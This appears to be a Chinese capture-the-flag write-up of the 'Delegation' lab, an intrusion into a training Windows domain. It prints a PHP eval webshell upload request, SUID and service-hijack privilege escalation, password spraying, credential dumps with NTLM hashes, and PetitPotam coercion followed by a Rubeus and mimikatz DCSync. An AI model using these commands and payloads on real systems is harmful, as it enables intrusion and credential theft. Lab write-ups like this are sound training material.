---
title: "春秋云镜 Delegation Writeup"
date: 2023-08-10T10:06:08+08:00
lastmod: 2023-08-10T10:06:08+08:00
draft: false
author: "X1r0z"

tags: ['windows', 'domain', 'kerberos']
categories: ['Writeup']

hiddenFromHomePage: false
hiddenFromSearch: false

toc:
  enable: true
math:
  enable: false
lightgallery: false
---

春秋云镜 Delegation Writeup

<!--more-->

## flag01

fscan

```shell
$ fscan ./fscan_darwin_arm64 -h 39.99.146.97
   ___                              _
  / _ \     ___  ___ _ __ __ _  ___| | __
 / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   <
\____/     |___/\___|_|  \__,_|\___|_|\_\
                     fscan version: 1.8.2
start infoscan
trying RunIcmp2
The current user permissions unable to send icmp packets
start ping
(icmp) Target 39.99.146.97    is alive
[*] Icmp alive hosts len is: 1
39.99.146.97:22 open
39.99.146.97:3306 open
39.99.146.97:21 open
39.99.146.97:80 open
[*] alive ports len is: 4
start vulscan
[*] WebTitle: http://39.99.146.97       code:200 len:68104  title:中文网页标题
```

右键源代码 `CmsEasy 7_7_5_20210919_UTF8`

后台弱口令 admin/123456

getshell 参考文章如下

[https://jdr2021.github.io/2021/10/14/CmsEasy_7.7.5_20211012存在任意文件写入和任意文件读取漏洞](https://jdr2021.github.io/2021/10/14/CmsEasy_7.7.5_20211012%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E5%92%8C%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/#%E5%AE%89%E8%A3%85%E5%8C%85%E4%B8%8B%E8%BD%BD)

```http
POST /index.php?case=template&act=save&admin_dir=admin&site=default HTTP/1.1
Host: 39.99.146.97
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://39.99.146.97/index.php?case=admin&act=login&admin_dir=admin&site=default
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Cookie: PHPSESSID=43a650lh9t803r774eahtu1gmk; loginfalse74c6352c5a281ec5947783b8a186e225=1; login_username=admin; login_password=a14cdfc627cef32c707a7988e70c1313
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 88

sid=#data_d_.._d_.._d_.._d_1.php&slen=693&scontent=<?php eval($_REQUEST[1]);phpinfo();?>
```

![image-20230809151650536](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202308091516570.png)

flag 位置, 需要提权

![image-20230809151932559](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202308091519590.png)

SUID

```shell
$ find / -perm -u=s -type f 2>/dev/null
/usr/bin/stapbpf
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/su
/usr/bin/chsh
/usr/bin/staprun
/usr/bin/at
/usr/bin/diff
/usr/bin/fusermount
/usr/bin/sudo
/usr/bin/mount
/usr/bin/newgrp
/usr/bin/umount
/usr/bin/passwd
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
```

利用 diff 命令

https://gtfobins.github.io/gtfobins/diff/

```shell
diff --line-format=%L /dev/null /home/flag/flag01.txt
```

![image-20230809152110151](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202308091521175.png)

## flag02

内网 fscan

```shell
$ ./fscan -h 172.22.4.0/24
   ___                              _    
  / _ \     ___  ___ _ __ __ _  ___| | __ 
 / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   <    
\____/     |___/\___|_|  \__,_|\___|_|\_\   
                     fscan version: 1.8.2
start infoscan
trying RunIcmp2
The current user permissions unable to send icmp packets
start ping
(icmp) Target 172.22.4.19     is alive
(icmp) Target 172.22.4.7      is alive
(icmp) Target 172.22.4.36     is alive
(icmp) Target 172.22.4.45     is alive
[*] Icmp alive hosts len is: 4
172.22.4.36:21 open
172.22.4.7:88 open
172.22.4.36:3306 open
172.22.4.45:445 open
172.22.4.7:445 open
172.22.4.19:445 open
172.22.4.45:139 open
172.22.4.7:139 open
172.22.4.19:139 open
172.22.4.45:135 open
172.22.4.7:135 open
172.22.4.19:135 open
172.22.4.45:80 open
172.22.4.36:80 open
172.22.4.36:22 open
[*] alive ports len is: 15
start vulscan
[*] NetInfo:
[*]172.22.4.19
   [->]FILESERVER
   [->]172.22.4.19
[*] NetInfo:
[*]172.22.4.45
   [->]WIN19
   [->]172.22.4.45
[*] NetInfo:
[*]172.22.4.7
   [->]DC01
   [->]172.22.4.7
[*] 172.22.4.7  (Windows Server 2016 Datacenter 14393)
[*] NetBios: 172.22.4.45     XIAORANG\WIN19                
[*] NetBios: 172.22.4.7      [+] DC:DC01.xiaorang.lab             Windows Server 2016 Datacenter 14393
[*] NetBios: 172.22.4.19     FILESERVER.xiaorang.lab             Windows Server 2016 Standard 14393
[*] WebTitle: http://172.22.4.36        code:200 len:68100  title:中文网页标题
[*] WebTitle: http://172.22.4.45        code:200 len:703    title:IIS Windows Server
```

整理信息

```shell
172.22.4.36 本机
172.22.4.19 FILESERVER
172.22.4.7 DC01
172.22.4.45 WIN19
```

根据上文的提示, 用户名为 `WIN19\Adrian`, 密码字典为 rockyou.txt

这里被坑了一把, fscan 识别不到密码过期的账户, 导致一直跑不出来

换成了 crackmapexec

```shell
proxychains crackmapexec smb 172.22.4.45 -u Adrian -p rockyou.txt -d WIN19
```

![image-20230809160747595](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202308091607631.png)

因为是本地账户, 直接 rdp 过去修改密码

![image-20230809161116120](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202308091611160.png)

![image-20230809161228370](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202308091612412.png)

桌面上有 PrivescCheck 和已经提前生成好的 report html

![image-20230809161551552](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202308091615586.png)

![image-20230809161801709](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202308091618739.png)

发现当前用户对 gpupdate 服务的注册表项具有写权限, 并且用户也可以启动和停止 gpupdate 服务

```shell
Name              : gupdate
ImagePath         : "C:\Program Files (x86)\Google\Update\GoogleUpdate.exe" /svc
User              : LocalSystem
ModifiablePath    : HKLM\SYSTEM\CurrentControlSet\Services\gupdate
IdentityReference : BUILTIN\Users
Permissions       : WriteDAC, Notify, ReadControl, CreateLink, EnumerateSubKeys, WriteOwner, Delete, CreateSubKey, SetV
                    alue, QueryValue
Status            : Stopped
UserCanStart      : True
UserCanStop       : True
```

直接修改 ImagePath, 然后手动启动服务以 SYSTEM 权限上线

![image-20230809162014147](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202308091620179.png)

![image-20230809162203916](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202308091622950.png)

Flag02

![image-20230809162258071](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202308091622106.png)

## flag03 & flag04

抓 Hash

```shell
meterpreter > creds_all
[+] Running as SYSTEM
[*] Retrieving all credentials
msv credentials
===============

Username  Domain    NTLM                              SHA1
--------  ------    ----                              ----
Adrian    WIN19     e19ccf75ee54e06b06a5907af13cef42  9131834cf4378828626b1beccaa5dea2c46f9b63
WIN19$    XIAORANG  2c05ad434d747b203a57565194891b38  a77f9e918a252e3ff4aec0f8ee06a60fc61cfac6
WIN19$    XIAORANG  5943c35371c96f19bda7b8e67d041727  5a4dc280e89974fdec8cf1b2b76399d26f39b8f8

wdigest credentials
===================

Username  Domain    Password
--------  ------    --------
(null)    (null)    (null)
Adrian    WIN19     (null)
WIN19$    XIAORANG  (null)

kerberos credentials
====================

Username  Domain        Password
--------  ------        --------
(null)    (null)        (null)
Adrian    WIN19         (null)
WIN19$    xiaorang.lab  ...... (略)
WIN19$    xiaorang.lab  ...... (略)
win19$    XIAORANG.LAB  ...... (略)
```

![image-20230809162903682](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202308091629717.png)

查看域内委派关系

```shell
$ proxychains findDelegation.py xiaorang.lab/'WIN19$' -hashes :2c05ad434d747b203a57565194891b38 -dc-ip 172.22.4.7
Impacket v0.11.0 - Copyright 2023 Fortra

AccountName  AccountType  DelegationType  DelegationRightsTo
-----------  -----------  --------------  ------------------
WIN19$       Computer     Unconstrained   N/A
```

WIN19 也就是当前机器配置了非约束委派, 那么结合 SpoolSample, PetitPotam 或者其它 XXCoerce 就能够拿到指定机器账户的 TGT

![image-20230809164529753](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202308091645800.png)

直接 PetitPotam, 然后 mimikatz 查看票据好像抓不到....

于是换成了 Rubeus (需要管理员权限)

```shell
Rubeus.exe monitor /interval:1 /filteruser:DC01$
```

PetitPotam

```shell
proxychains python3 PetitPotam.py -u 'WIN19$' -hashes :2c05ad434d747b203a57565194891b38 -d xiaorang.lab -dc-ip 172.22.4.7 WIN19.xiaorang.lab DC01.xiaorang.lab
```

![image-20230809165108799](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202308091651839.png)

`DC01$` 的 TGT

![image-20230809165751100](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202308091657142.png)

导入 TGT 然后 DCSync

```shell
Rubeus.exe ptt /ticket:xxx
mimikatz.exe "lsadump::dcsync /all /csv"
```

![image-20230809165919237](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202308091659283.png)

![image-20230809165958649](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202308091659693.png)

flag03

![image-20230809170246945](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202308091702986.png)

flag04

![image-20230809170157678](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202308091701727.png)

在 FILESERVER 上发现了域管的 session, 感觉正常步骤好像应该是先拿 FILESERVER 导出域管密码然后再拿下域控?